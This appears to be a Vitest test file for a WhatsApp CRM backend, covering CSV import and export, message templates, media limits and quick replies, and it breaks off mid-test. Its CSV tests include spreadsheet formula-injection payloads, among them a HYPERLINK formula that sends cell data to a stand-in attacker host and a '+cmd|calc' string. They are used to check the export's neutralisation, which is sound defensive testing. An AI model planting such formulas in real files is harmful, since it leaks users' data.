import { parse as parseCsv } from 'csv-parse/sync';
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest';
import { AppError } from '../lib/errors.js';
import { buildCreateComponents } from '../routes/templates.js';
import { csvCell, detectCsvDelimiter, parseAmount } from '../routes/contacts.js';
import { ensureUploaded, saveMedia, webpInfo } from '../services/media.js';
import { buildTemplateComponents, checkTemplateParams, templateSchema, upsertTemplate } from '../services/templates.js';
import { SandboxProvider } from '../whatsapp/sandbox.js';
import { MetaApiError } from '../whatsapp/types.js';
import { setup, type TestEnv } from './helpers.js';

let env: TestEnv;
let ws: string;
let channel: any;
let agentA: { id: string; cookie: string };
let agentB: { id: string; cookie: string };
let seq = 0;

const q = (sql: string, params: unknown[] = []) => env.built.ctx.db.query<any>(sql, params);

async function login(email: string, password: string) {
  const r = await env.built.app.inject({ method: 'POST', url: '/api/auth/login', payload: { email, password } });
  return `ll_token=${r.cookies.find((c) => c.name === 'll_token')!.value}`;
}

/** A contact whose 24 h window is open (it just wrote to us through the sandbox). */
async function inboundContact(name = 'Cliente') {
  const from = `52155${String(7000000 + ++seq).padStart(8, '0')}`;
  const sim = await env.api('POST', `/api/channels/${channel.id}/simulate`, { from, name, text: 'hola' });
  expect(sim.status).toBe(200);
  return sim.body.message.contact_id as string;
}

function multipart(filename: string, mime: string, data: Buffer) {
  const boundary = '----leadlibre';
  const payload = Buffer.concat([
    Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: ${mime}\r\n\r\n`),
    data,
    Buffer.from(`\r\n--${boundary}--\r\n`),
  ]);
  return { payload, headers: { 'content-type': `multipart/form-data; boundary=${boundary}` } };
}

function upload(filename: string, mime: string, data: Buffer) {
  const m = multipart(filename, mime, data);
  return env.api('POST', '/api/media', m.payload, { headers: m.headers });
}

/** Minimal WebP: an extended (VP8X) header with the canvas size, padded to `size` bytes. */
function webpVp8x(width: number, height: number, size: number, animated = false) {
  const b = Buffer.alloc(Math.max(size, 30));
  b.write('RIFF', 0, 'ascii');
  b.writeUInt32LE(b.length - 8, 4);
  b.write('WEBP', 8, 'ascii');
  b.write('VP8X', 12, 'ascii');
  b.writeUInt32LE(10, 16);
  b[20] = animated ? 0x02 : 0;
  b.writeUIntLE(width - 1, 24, 3);
  b.writeUIntLE(height - 1, 27, 3);
  return b;
}

/** Lossless (VP8L) WebP header, as browsers save photos from websites. */
function webpVp8l(width: number, height: number, size: number) {
  const b = Buffer.alloc(Math.max(size, 30));
  b.write('RIFF', 0, 'ascii');
  b.writeUInt32LE(b.length - 8, 4);
  b.write('WEBP', 8, 'ascii');
  b.write('VP8L', 12, 'ascii');
  b.writeUInt32LE(b.length - 20, 16);
  b[20] = 0x2f;
  b.writeUInt32LE(((width - 1) | ((height - 1) << 14)) >>> 0, 21);
  return b;
}

beforeAll(async () => {
  env = await setup();
  ws = (await env.register('contenido@test.com', 'Contenido')).workspaceId;
  channel = (await env.api('POST', '/api/channels', { provider: 'sandbox', name: 'S' })).body.channel;
  for (const [i, email] of ['ana-g5@test.com', 'beto-g5@test.com'].entries()) {
    const r = await env.api('POST', '/api/workspace/members', { email, name: `Agente ${i}`, password: 'agente1234', role: 'agent' });
    expect(r.status).toBe(200);
    const cookie = await login(email, 'agente1234');
    if (i === 0) agentA = { id: r.body.id, cookie };
    else agentB = { id: r.body.id, cookie };
  }
});
afterAll(() => env.close());
afterEach(() => vi.restoreAllMocks());

describe('contact upsert and restricted agents (#19)', () => {
  it('does not reveal or touch a contact assigned to someone else', async () => {
    const owner = await env.api('POST', '/api/contacts', { phone: '+52 1 55 1111 2222', name: 'Cliente VIP', email: 'vip@cliente.com', deal_value: 50000 });
    const id = owner.body.contact.id;
    await env.api('PATCH', `/api/contacts/${id}`, { assigned_user_id: agentB.id });
    await env.api('PUT', '/api/workspace/settings', { agent_visibility: 'assigned' });
    try {
      for (const phone of ['+52 1 55 1111 2222', '5511112222']) {
        const r = await env.api('POST', '/api/contacts', { phone, name: 'Otro nombre', assigned_user_id: agentA.id }, { cookie: agentA.cookie });
        expect(r.status).toBe(409);
        expect(r.body.error.code).toBe('CONTACT_EXISTS');
        expect(r.raw).not.toContain('vip@cliente.com');
        expect(r.raw).not.toContain('Cliente VIP');
        expect(r.body.contact).toBeUndefined();
      }
      const row = (await q(`SELECT name, assigned_user_id FROM contacts WHERE id = $1`, [id])).rows[0];
      expect(row).toEqual({ name: 'Cliente VIP', assigned_user_id: agentB.id });
      // An unassigned contact stays visible to everyone, so the upsert still answers with it.
      const free = (await env.api('POST', '/api/contacts', { phone: '5511113333', name: 'Libre' })).body.contact;
      const again = await env.api('POST', '/api/contacts', { phone: '5511113333' }, { cookie: agentA.cookie });
      expect(again.status).toBe(200);
      expect(again.body).toMatchObject({ created: false, contact: { id: free.id } });
      // Without the restriction the agent sees it as before.
      await env.api('PUT', '/api/workspace/settings', { agent_visibility: 'all' });
      const open = await env.api('POST', '/api/contacts', { phone: '5511112222' }, { cookie: agentA.cookie });
      expect(open.status).toBe(200);
      expect(open.body.contact.id).toBe(id);
    } finally {
      await env.api('PUT', '/api/workspace/settings', { agent_visibility: 'all' });
    }
  });
});

describe('CSV export formulas (#30, #59)', () => {
  it('neutralizes formulas at the start of any cell a spreadsheet could split out', () => {
    expect(csvCell('=1+1')).toBe("'=1+1");
    expect(csvCell('Ana;=1+1;')).toBe("Ana;'=1+1;");
    expect(csvCell('x,+cmd|calc')).toBe("x,'+cmd|calc");
    expect(csvCell('a\n@SUM(1)')).toBe("a\n'@SUM(1)");
    expect(csvCell('a; "-2+3')).toBe(`a; "'-2+3`);
    expect(csvCell('\tabc')).toBe("'\tabc");
    expect(csvCell('juan@x.com')).toBe('juan@x.com');
    expect(csvCell(null)).toBe('');
  });

  it('exports source, tags, custom fields and names without live formulas in ; or , separated readers', async () => {
    const c = (await env.api('POST', '/api/contacts', { phone: '5255888002', name: 'Ana;=1+1;', custom_fields: { nota: 'x;=3+3' } })).body.contact;
    const t1 = (await env.api('POST', '/api/tags', { name: 'Aaa' })).body.tag;
    // A ';' is no longer accepted in a tag name: a tag created before that rule.
    const t2 = (await q(`INSERT INTO tags (workspace_id, name) VALUES ($1, '=2+3;') RETURNING *`, [ws])).rows[0];
    await env.api('PATCH', `/api/contacts/${c.id}`, { tag_ids: [t1.id, t2.id] });
    await q(`UPDATE contacts SET source = $2 WHERE id = $1`, [c.id, '=HYPERLINK("http://ev.il/?"&A2,"Ver")']);
    const r = await env.api('GET', '/api/contacts/export.csv');
    expect(r.status).toBe(200);
    const rows = parseCsv(r.raw.replace(/^﻿/, ''), { columns: true }) as Record<string, string>[];
    const row = rows.find((x) => x.telefono.endsWith('525255888002'))!;
    expect(row.nombre).toBe("Ana;'=1+1;");
    expect(row.origen).toBe(`'=HYPERLINK("http://ev.il/?"&A2,"Ver")`);
    expect(row.etiquetas.split(';')).toEqual(expect.arrayContaining(['Aaa', "'=2+3"]));
    expect(row.campos).toContain(";'=3+3");
    // Excel with ';' as list separator ignores quotes that do not open a field: split the raw text.
    for (const line of r.raw.split(/\r?\n/)) {
      for (const seg of line.split(/[;\t]/)) {
        expect(seg.replace(/^[\s"]+/, ''), line).not.toMatch(/^[=+\-@]/);
      }
    }
  });
});

describe('CSV import delimiters (#84)', () => {
  it('detects ; , and tab from the header line', () => {
    expect(detectCsvDelimiter('nombre;teléfono;correo\n1,5;2;3')).toBe(';');
    expect(detectCsvDelimiter('nombre,teléfono,correo\na;b,c,d')).toBe(',');
    expect(detectCsvDelimiter('nombre\tteléfono\n')).toBe('\t');
    expect(detectCsvDelimiter('"Nombre; completo",telefono\n')).toBe(',');
    expect(parseAmount('1.500,50')).toBe(1500.5);
    expect(parseAmount('$1,500.50')).toBe(1500.5);
    expect(parseAmount('1500,5')).toBe(1500.5);
    expect(parseAmount('1,500')).toBe(1500);
    expect(parseAmount('2.000.000')).toBe(2000000);
    expect(parseAmount('abc')).toBe(0);
  });

  it('imports a semicolon CSV saved by Excel (BOM, CRLF, quoted fields, decimal comma)', async () => {
    const csv = '﻿nombre;teléfono;correo;etiquetas;valor;Ciudad\r\n"Pérez; Juan";55 3434 0001;juan@x.com;VIP;1.500,50;Madrid\r\nMaría;55 3434 0002;;Expo;;"Bogotá"\r\n';
    const r = await env.api('POST', '/api/contacts/import', { csv });
    expect(r.status).toBe(200);
    expect(r.body).toMatchObject({ total: 2, created: 2, error_count: 0 });
    const juan = (await env.api('GET', '/api/contacts?search=3434').then((x) => x.body.items)).find((c: any) => c.phone === '525534340001');
    expect(juan).toMatchObject({ name: 'Pérez; Juan', email: 'juan@x.com', deal_value: 1500.5, custom_fields: { Ciudad: 'Madrid' } });
    expect(juan.tag_ids).toHaveLength(1);
  });

  it('reads dot-grouped peso amounts as thousands, also with a single group', async () => {
    expect(parseAmount('$ 150.000')).toBe(150000);
    expect(parseAmount('25.000')).toBe(25000);
    expect(parseAmount('$ 1.500')).toBe(1500);
    expect(parseAmount('$ 2.500.000')).toBe(2500000);
    expect(parseAmount('$ 150.000,00')).toBe(150000);
    // Real decimals are untouched: two decimals, a leading 0 or a 4+ digit integer part.
    expect(parseAmount('1500.50')).toBe(1500.5);
    expect(parseAmount('0.500')).toBe(0.5);
    expect(parseAmount('1234.567')).toBe(1234.567);
    const csv = 'nombre;teléfono;valor\r\nCaro;55 3434 0010;$ 150.000\r\nDani;55 3434 0011;$ 1.500\r\n';
    const r = await env.api('POST', '/api/contacts/import', { csv });
    expect(r.body).toMatchObject({ created: 2, error_count: 0 });
    const vals = (await q(`SELECT phone, deal_value::float AS v FROM contacts WHERE workspace_id = $1 AND phone IN ('525534340010', '525534340011') ORDER BY phone`, [ws])).rows;
    expect(vals).toEqual([
      { phone: '525534340010', v: 150000 },
      { phone: '525534340011', v: 1500 },
    ]);
  });

  it('refuses a cp1252 (Excel "CSV" in Spanish) file decoded as UTF-8 instead of garbling it', async () => {
    const bytes = Buffer.from('Nombre;Tel\xe9fono;Correo\r\nMar\xeda P\xe9rez;55 3434 0020;maria@x.com\r\n', 'latin1');
    const csv = new TextDecoder('utf-8').decode(bytes);
    expect(csv).toContain('Tel\ufffdfono');
    const r = await env.api('POST', '/api/contacts/import', { csv });
    expect(r.status).toBe(400);
    expect(r.body.error.code).toBe('CSV_NOT_UTF8');
    expect(r.body.error.message).toMatch(/CSV UTF-8/);
    expect((await q(`SELECT count(*)::int AS n FROM contacts WHERE workspace_id = $1 AND phone = '525534340020'`, [ws])).rows[0].n).toBe(0);
    // The same file decoded correctly imports with its accents.
    const ok = await env.api('POST', '/api/contacts/import', { csv: new TextDecoder('windows-1252').decode(bytes) });
    expect(ok.body).toMatchObject({ created: 1, error_count: 0 });
    const c = (await q(`SELECT name FROM contacts WHERE workspace_id = $1 AND phone = '525534340020'`, [ws])).rows[0];
    expect(c).toEqual({ name: 'María Pérez' });
  });

  it('imports a tab-separated file', async () => {
    const r = await env.api('POST', '/api/contacts/import', { csv: 'Nombre\tCelular\nLuis\t55 3434 0003\n' });
    expect(r.body).toMatchObject({ total: 1, created: 1, error_count: 0 });
  });

  it('reads its own export back (quoted cells, formula guard removed)', async () => {
    const r = await env.api('POST', '/api/contacts/import', { csv: `"telefono","nombre"\n"'+4412345678","'=Raro"\n` });
    expect(r.body).toMatchObject({ created: 1, error_count: 0 });
    const c = (await q(`SELECT name FROM contacts WHERE workspace_id = $1 AND phone = '4412345678'`, [ws])).rows[0];
    expect(c).toEqual({ name: '=Raro' });
  });
});

describe('templates the code could not fill (#60, #81)', () => {
  const location = [{ type: 'HEADER', format: 'LOCATION' }, { type: 'BODY', text: 'Tu pedido {{1}} va en camino' }];
  const coupon = [{ type: 'BODY', text: 'Usa tu cupón' }, { type: 'BUTTONS', buttons: [{ type: 'COPY_CODE', example: 'VERANO15' }] }];
  const carousel = [
    { type: 'BODY', text: 'Mira las novedades' },
    { type: 'CAROUSEL', cards: [{ components: [{ type: 'HEADER', format: 'IMAGE' }, { type: 'BODY', text: 'Tarjeta' }] }] },
  ];

  it('describes location headers, coupon buttons and unsupported carousels', () => {
    expect(templateSchema(location)).toEqual({ header: { type: 'location', variables: [] }, body: ['1'], buttons: [], unsupported: null });
    expect(templateSchema(coupon).buttons).toEqual([{ index: 0, type: 'COPY_CODE', text: 'Copiar código', variables: ['coupon_code'] }]);
    expect(templateSchema(carousel).unsupported).toMatch(/carrusel/);
  });

  it('builds the location header and the coupon_code button, and refuses missing ones in Spanish', () => {
    expect(
      buildTemplateComponents({ header: { type: 'location', latitude: 19.43, longitude: -99.13, name: 'Bodega' }, body: ['A-1'] }, false, location),
    ).toEqual([
      { type: 'header', parameters: [{ type: 'location', location: { latitude: 19.43, longitude: -99.13, name: 'Bodega', address: undefined } }] },
      { type: 'body', parameters: [{ type: 'text', text: 'A-1' }] },
    ]);
    expect(buildTemplateComponents({ buttons: [{ index: 0, text: 'VERANO15' }] }, false, coupon)).toEqual([
      { type: 'button', sub_type: 'copy_code', index: '0', parameters: [{ type: 'coupon_code', coupon_code: 'VERANO15' }] },
    ]);
    // Unknown (not synced) template: the caller says which kind of button it is.
    expect(buildTemplateComponents({ buttons: [{ index: 1, text: 'X1', sub_type: 'copy_code' }] }, false, [])).toEqual([
      { type: 'button', sub_type: 'copy_code', index: '1', parameters: [{ type: 'coupon_code', coupon_code: 'X1' }] },
    ]);
    const err = (fn: () => unknown) => {
      try {
        fn();
      } catch (e) {
        return e as AppError;
      }
      throw new Error('no error');
    };
    expect(err(() => buildTemplateComponents({ body: ['A-1'] }, false, location))).toMatchObject({ code: 'TEMPLATE_PARAMS_MISSING', message: expect.stringMatching(/ubicación/) });
    expect(err(() => buildTemplateComponents(undefined, false, coupon))).toMatchObject({ code: 'TEMPLATE_PARAMS_MISSING', message: expect.stringMatching(/cupón/) });
    expect(err(() => checkTemplateParams(coupon, { buttons: [{ index: 0, text: 'DEMASIADO_LARGO_123' }] }))).toMatchObject({ code: 'TEMPLATE_PARAMS_INVALID' });
    expect(err(() => checkTemplateParams(location, { header: { type: 'location', latitude: 19.4, longitude: -99.1 } }))).toMatchObject({ message: expect.stringMatching(/\{\{1\}\}/) });
    expect(err(() => buildTemplateComponents({}, false, carousel))).toMatchObject({ code: 'TEMPLATE_UNSUPPORTED' });
  });

  it('sends them with the parameters Meta needs and refuses incomplete sends before storing anything', async () => {
    const chRow = (await q(`SELECT * FROM channels WHERE id = $1`, [channel.id])).rows[0];
    await env.built.ctx.db.tx(async (tx) => {
      await upsertTemplate(tx, chRow, { meta_id: 'l1', name: 'envio', language: 'es_MX', category: 'UTILITY', status: 'APPROVED', components: location });
      await upsertTemplate(tx, chRow, { meta_id: 'c1', name: 'cupon', language: 'es_MX', category: 'MARKETING', status: 'APPROVED', components: coupon });
      await upsertTemplate(tx, chRow, { meta_id: 'k1', name: 'carrusel', language: 'es_MX', category: 'MARKETING', status: 'APPROVED', components: carousel });
    });
    const list = (await env.api('GET', '/api/templates')).body.templates;
    expect(list.find((t: any) => t.name === 'carrusel').inputs.unsupported).toMatch(/carrusel/);
    expect(list.find((t: any) => t.name === 'envio').inputs.header).toEqual({ type: 'location', variables: [] });

    const id = await inboundContact('Pedro');
    const count = async () => (await q(`SELECT count(*)::int AS n FROM messages WHERE contact_id = $1 AND direction = 'out'`, [id])).rows[0].n;
    const send = (body: unknown) => env.api('POST', `/api/contacts/${id}/messages`, body);
    const spy = vi.spyOn(SandboxProvider.prototype, 'send');

    const noLoc = await send({ type: 'template', name: 'envio', language: 'es_MX', params: { body: ['A-1'] } });
    expect(noLoc.status).toBe(400);
    expect(noLoc.body.error.code).toBe('TEMPLATE_PARAMS_MISSING');
    const noCoupon = await send({ type: 'template', name: 'cupon', language: 'es_MX', params: {} });
    expect(noCoupon.status).toBe(400);
    const car = await send({ type: 'template', name: 'carrusel', language: 'es_MX' });
    expect(car.status).toBe(400);
    expect(car.body.error.code).toBe('TEMPLATE_UNSUPPORTED');
    expect(await count()).toBe(0);
    expect(spy).not.toHaveBeenCalled();

    const ok = await send({
      type: 'template',
      name: 'envio',
      language: 'es_MX',
      params: { header: { type: 'location', latitude: 19.43, longitude: -99.13, name: 'Bodega', address: 'Calle 1' }, body: ['A-1'] },
    });
    expect(ok.status).toBe(200);
    expect(ok.body.message.status).not.toBe('failed');
    const sentLoc = spy.mock.calls.at(-1)![1] as any;
    expect(sentLoc.template.components[0]).toEqual({
      type: 'header',
      parameters: [{ type: 'location', location: { latitude: 19.43, longitude: -99.13, name: 'Bodega', address: 'Calle 1' } }],
    });
    const cup = await send({ type: 'template', name: 'cupon', language: 'es_MX', params: { buttons: [{ index: 0, text: 'VERANO15' }] } });
    expect(cup.status).toBe(200);
    expect((spy.mock.calls.at(-1)![1] as any).template.components).toEqual([
      { type: 'button', sub_type: 'copy_code', index: '0', parameters: [{ type: 'coupon_code', coupon_code: 'VERANO15' }] },
    ]);

    // Scheduling refuses up front what would only fail at send time.
    const later = new Date(Date.now() + 3600_000).toISOString();
    const sch = await env.api('POST', `/api/contacts/${id}/scheduled`, { send_at: later, content: { type: 'template', name: 'envio', language: 'es_MX', params: { body: ['A-1'] } } });
    expect(sch.status).toBe(400);
    expect(sch.body.error.code).toBe('TEMPLATE_PARAMS_MISSING');
  });
});

describe('authentication templates (#35)', () => {
  it('builds the preset body, expiration footer and one-time-password button Meta requires', () => {
    const r = buildCreateComponents({
      channel_id: '00000000-0000-0000-0000-000000000000',
      name: 'codigo',
      language: 'es_MX',
      category: 'AUTHENTICATION',
      body: { text: 'Tu código es {{1}}', examples: ['123456'] },
      buttons: [{ type: 'QUICK_REPLY', text: 'Ok' }],
      code_expiration_minutes: 10,
    });
    expect(r.components).toEqual([
      { type: 'BODY', add_security_recommendation: true },
      { type: 'FOOTER', code_expiration_minutes: 10 },
      { type: 'BUTTONS', buttons: [{ type: 'OTP', otp_type: 'COPY_CODE' }] },
    ]);
    expect(r.parameter_format).toBeUndefined();
  });

  it('creates one through the API and sends the code in the body and the button', async () => {
    const create = vi.spyOn(SandboxProvider.prototype, 'createTemplate');
    const r = await env.api('POST', '/api/templates', {
      channel_id: channel.id,
      name: 'codigo_acceso',
      language: 'es_MX',
      category: 'AUTHENTICATION',
      security_recommendation: true,
      code_expiration_minutes: 5,
      otp_button_text: 'Copiar código',
    });
    expect(r.status).toBe(200);
    const sent = create.mock.calls[0][0];
    expect(sent.category).toBe('AUTHENTICATION');
    expect(sent.parameter_format).toBeUndefined();
    expect(sent.components).toEqual([
      { type: 'BODY', add_security_recommendation: true },
      { type: 'FOOTER', code_expiration_minutes: 5 },
      { type: 'BUTTONS', buttons: [{ type: 'OTP', otp_type: 'COPY_CODE', text: 'Copiar código' }] },
    ]);
    expect(r.body.template.inputs).toEqual({ header: null, body: ['1'], buttons: [], unsupported: null });

    const id = await inboundContact('Lucía');
    const spy = vi.spyOn(SandboxProvider.prototype, 'send');
    const m = await env.api('POST', `/api/contacts/${id}/messages`, { type: 'template', name: 'codigo_acceso', language: 'es_MX', params: { body: ['482913'] } });
    expect(m.status).toBe(200);
    expect(m.body.message.body).toContain('*482913* es tu código de verificación.');
    expect((spy.mock.calls.at(-1)![1] as any).template.components).toEqual([
      { type: 'body', parameters: [{ type: 'text', text: '482913' }] },
      { type: 'button', sub_type: 'url', index: '0', parameters: [{ type: 'text', text: '482913' }] },
    ]);
  });

  it('fills the code button of an authentication template as Meta lists it', () => {
    const synced = [
      { type: 'BODY', text: '*{{1}}* es tu código de verificación.' },
      { type: 'BUTTONS', buttons: [{ type: 'URL', text: 'Copiar código', url: 'https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp{{1}}' }] },
    ];
    expect(templateSchema(synced).buttons).toEqual([]);
    expect(buildTemplateComponents({ body: ['9911'] }, false, synced)).toEqual([
      { type: 'body', parameters: [{ type: 'text', text: '9911' }] },
      { type: 'button', sub_type: 'url', index: '0', parameters: [{ type: 'text', text: '9911' }] },
    ]);
  });
});

describe('media WhatsApp accepts (#37, #79, #80)', () => {
  it('only accepts the types the Cloud API /media endpoint takes', async () => {
    for (const [name, mime] of [
      ['a.zip', 'application/zip'],
      ['a.csv', 'text/csv'],
      ['a.odt', 'application/vnd.oasis.opendocument.text'],
      ['a.apk', 'application/vnd.android.package-archive'],
      ['a.opus', 'audio/opus'],
      ['a.gif', 'image/gif'],
    ]) {
      const r = await upload(name, mime, Buffer.from('data'));
      expect(r.status, mime).toBe(400);
      expect(r.body.error.code, mime).toBe('MEDIA_TYPE_NOT_SUPPORTED');
    }
    for (const [name, mime] of [
      ['a.docx', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'],
      ['a.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'],
      ['a.txt', 'text/plain'],
      ['a.amr', 'audio/amr'],
      ['a.3gp', 'video/3gpp'],
    ]) {
      expect((await upload(name, mime, Buffer.from('data'))).status, mime).toBe(200);
    }
    const m4a = await upload('nota.m4a', 'audio/x-m4a', Buffer.from('data'));
    expect(m4a.body.media.mime).toBe('audio/mp4');
  });

  it('applies the per-type size limits (5 MB images)', async () => {
    const big = await upload('foto.jpg', 'image/jpeg', Buffer.alloc(6 * 1024 * 1024, 1));
    expect(big.status).toBe(400);
    expect(big.body.error.code).toBe('MEDIA_TOO_LARGE');
    expect(big.body.error.message).toMatch(/5\.0 MB/);
    expect((await upload('foto.jpg', 'image/jpeg', Buffer.alloc(4 * 1024 * 1024, 1))).status).toBe(200);
    expect((await upload('video.mp4', 'video/mp4', Buffer.alloc(6 * 1024 * 1024, 1))).status).toBe(200);
  });

  it('accepts WebP only when it qualifies as a sticker', async () => {
    expect(webpInfo(webpVp8l(1200, 800, 40))).toEqual({ width: 1200, height: 800, animated: false });
    expect(webpInfo(webpVp8x(512, 512, 40, true))).toEqual({ width: 512, height: 512, animated: true });
    expect(webpInfo(Buffer.from('not a webp at all, just text....'))).toBeNull();
    const photo = await upload('producto.webp', 'image/webp', webpVp8l(1200, 800, 300 * 1024));
    expect(photo.status).toBe(400);
    expect(photo.body.error.code).toBe('STICKER_NOT_VALID');
    expect(photo.body.error.message).toMatch(/JPG o PNG/);
    expect((await upload('s.webp', 'image/webp', webpVp8x(512, 512, 150 * 1024))).status).toBe(400);
    expect((await upload('s.webp', 'image/webp', Buffer.from('garbage'))).status).toBe(400);
    expect((await upload('s.webp', 'image/webp', webpVp8x(512, 512, 60 * 1024))).status).toBe(200);
    expect((await upload('a.webp', 'image/webp', webpVp8x(512, 512, 300 * 1024, true))).status).toBe(200);
  });

  it('refuses a small WebP that is not exactly 512×512 instead of sending a photo as a sticker', async () => {
    for (const [w, h] of [[400, 300], [512, 300], [256, 256]]) {
      for (const file of [webpVp8l(w, h, 30 * 1024), webpVp8x(w, h, 30 * 1024)]) {
        const r = await upload('miniatura.webp', 'image/webp', file);
        expect(r.status, `${w}x${h}`).toBe(400);
        expect(r.body.error.code).toBe('STICKER_NOT_VALID');
        expect(r.body.error.message).toMatch(/512×512/);
      }
    }
    // A stored one (received from a customer) is refused at send time too, before any upload.
    const stored = await saveMedia(env.built.ctx, ws, webpVp8l(400, 300, 30 * 1024), 'image/webp', 'foto.webp');
    const uploadMedia = vi.fn();
    const err = await ensureUploaded(env.built.ctx, stored, { id: channel.id } as any, { uploadMedia } as any).catch((e) => e);
    expect(err).toBeInstanceOf(AppError);
    expect(err.code).toBe('STICKER_NOT_VALID');
    expect(uploadMedia).not.toHaveBeenCalled();
  });

  it('refuses an oversize stored file at send time with a reason instead of a 500', async () => {
    const id = await inboundContact('Rosa');
    const file = await saveMedia(env.built.ctx, ws, Buffer.alloc(6 * 1024 * 1024, 1), 'image/jpeg', 'grande.jpg');
    const r = await env.api('POST', `/api/contacts/${id}/messages`, { type: 'media', media_file_id: file.id });
    expect(r.status).toBe(400);
    expect(r.body.error.code).toBe('MEDIA_TOO_LARGE');
    expect((await q(`SELECT count(*)::int AS n FROM messages WHERE contact_id = $1 AND direction = 'out'`, [id])).rows[0].n).toBe(0);
  });

  it('turns a Meta upload rejection into a clear 400', async () => {
    const file = await saveMedia(env.built.ctx, ws, Buffer.from('%PDF-1.4'), 'application/pdf', 'a.pdf');
    const provider = {
      uploadMedia: async () => {
        throw new MetaApiError('(#131053) Media upload error', 131053, 400);
      },
    } as any;
    const err = await ensureUploaded(env.built.ctx, file, { id: channel.id } as any, provider).catch((e) => e);
    expect(err).toBeInstanceOf(AppError);
    expect(err.status).toBe(400);
    expect(err.code).toBe('META_ERROR');
    expect(err.message).toMatch(/formato o tamaño/);
  });
});

describe('quick replies (#34, #61, #42, #85)', () => {
  const qr = (body: unknown) => env.api('POST', '/api/quick-replies', body);

  it('sends the text as its own message when the file cannot carry it as a caption', async () => {
    const id = await inboundContact('Mario López');
    const audio = (await upload('nota.ogg', 'audio/ogg', Buffer.from('OggS'))).body.media;
    const sticker = (await upload('s.webp', 'image/webp', webpVp8x(512, 512, 2048))).body.media;
    const image = (await upload('precios.jpg', 'image/jpeg', Buffer.from('jpeg'))).body.media;
    const long = 'Lista de precios {primer_nombre}: ' + 'x'.repeat(1500);
    const cases = [
      { shortcut: 'audio_precios', media: audio, body: 'Aquí tienes la lista de precios: {primer_nombre}', types: ['audio', 'text'] },
      { shortcut: 'sticker_hola', media: sticker, body: 'Hola {primer_nombre}', types: ['sticker', 'text'] },
      { shortcut: 'imagen_larga', media: image, body: long, types: ['image', 'text'] },
    ];
    const spy = vi.spyOn(SandboxProvider.prototype, 'send');
    for (const c of cases) {
      const created = await qr({ shortcut: c.shortcut, body: c.body, media_file_id: c.media.id });
      expect(created.status).toBe(200);
      spy.mockClear();
      const r = await env.api('POST', `/api/contacts/${id}/messages`, { type: 'quick_reply', quick_reply_id: created.body.quick_reply.id });
      expect(r.status, c.shortcut).toBe(200);
      expect(r.body.messages.map((m: any) => m.type)).toEqual(c.types);
      expect(r.body.message.id).toBe(r.body.messages[0].id);
      expect(r.body.messages[0].body).toBeNull();
      expect(r.body.messages[1].body).toBe(c.body.replace('{primer_nombre}', 'Mario'));
      const [media, text] = spy.mock.calls.map((call) => call[1] as any);
      expect(media[media.type].caption).toBeUndefined();
      expect(text.text.body).toBe(c.body.replace('{primer_nombre}', 'Mario'));
    }
    // A short text on an image still travels as its caption, in one message.
    const short = await qr({ shortcut: 'imagen_corta', body: 'Precios {primer_nombre}', media_file_id: image.id });
    spy.mockClear();
    const one = await env.api('POST', `/api/contacts/${id}/messages`, { type: 'quick_reply', quick_reply_id: short.body.quick_reply.id });
    expect(one.body.messages).toHaveLength(1);
    expect(one.body.message).toMatchObject({ type: 'image', body: 'Precios Mario' });
    expect((spy.mock.calls[0][1] as any).image.caption).toBe('Precios Mario');
  });

  it('refuses attachments WhatsApp would reject when saving', async () => {
    const big = await saveMedia(env.built.ctx, ws, Buffer.alloc(6 * 1024 * 1024, 1), 'image/jpeg', 'grande.jpg');
    const zip = await saveMedia(env.built.ctx, ws, Buffer.from('PK'), 'application/zip', 'a.zip');
    const r1 = await qr({ shortcut: 'grande', body: 'x', media_file_id: big.id });
    expect(r1.status).toBe(400);
    expect(r1.body.error.code).toBe('MEDIA_TOO_LARGE');
    const r2 = await qr({ shortcut: 'zip', body: 'x', media_file_id: zip.id });
    expect(r2.body.error.code).toBe('MEDIA_TYPE_NOT_SUPPORTED');
    const ok = (await qr({ shortcut: 'sin_archivo', body: 'x' })).body.quick_reply;
    const r3 = await env.api('PATCH', `/api/quick-replies/${ok.id}`, { media_file_id: big.id });
    expect(r3.status).toBe(400);
  });

  it('clears the title when the editor sends null', async () => {
    const created = (await qr({ shortcut: 'precios', title: 'Lista de precios', body: 'hola' })).body.quick_reply;
    const r = await env.api('PATCH', `/api/quick-replies/${created.id}`, { shortcut: 'precios', title: null, body: 'hola', media_file_id: null });
    expect(r.status).toBe(200);
    expect(r.body.quick_reply.title).toBeNull();
    const kept = await env.api('PATCH', `/api/quick-replies/${created.id}`, { body: 'hola 2' });
    expect(kept.body.quick_reply).toMatchObject({ title: null, body: 'hola 2' });
    const set = await env.api('PATCH', `/api/quick-replies/${created.id}`, { title: 'Nuevo' });
    expect(set.body.quick_reply.title).toBe('Nuevo');
    const untouched = await env.api('PATCH', `/api/quick-replies/${created.id}`, { body: 'hola 3' });
    expect(untouched.body.quick_reply.title).toBe('Nuevo');
  });

  it('refuses to create a quick reply over an existing shortcut', async () => {
    const original = (await qr({ shortcut: 'horario', title: 'Horario', body: 'Abrimos de 9 a 6' })).body.quick_reply;
    const dup = await qr({ shortcut: 'Horario', body: 'Otra cosa' });
    expect(dup.status).toBe(409);
    expect(dup.body.error.code).toBe('SHORTCUT_TAKEN');
    expect(dup.body.error.message).toContain('/horario');
    const list = (await env.api('GET', '/api/quick-replies')).body.quick_replies.filter((x: any) => x.shortcut === 'horario');
    expect(list).toEqual([expect.objectContaining({ id: original.id, title: 'Horario', body: 'Abrimos de 9 a 6' })]);
    const other = (await qr({ shortcut: 'ubicacion', body: 'Estamos en el centro' })).body.quick_reply;
    const rename = await env.api('PATCH', `/api/quick-replies/${other.id}`, { shortcut: 'horario' });
    expect(rename.status).toBe(409);
  });
});

describe('scheduled messages in the contact panel (contract 4)', () => {
  it('lists recent failed sends with their error and lets them be dismissed', async () => {
    const id = await inboundContact('Programado');
    const insert = async (status: string, sendAt: string, error: string | null) =>
      (
        await q(
          `INSERT INTO scheduled_messages (workspace_id, contact_id, content, send_at, status, error) VALUES ($1, $2, $3, $4, $5, $6) RETURNING id`,
          [ws, id, JSON.stringify({ type: 'text', text: 'x' }), sendAt, status, error],
        )
      ).rows[0].id as string;
    const pending = await insert('pending', new Date(Date.now() + 3600_000).toISOString(), null);
    const failed = await insert('failed', new Date(Date.now() - 3600_000).toISOString(), 'Falta un parámetro requerido.');
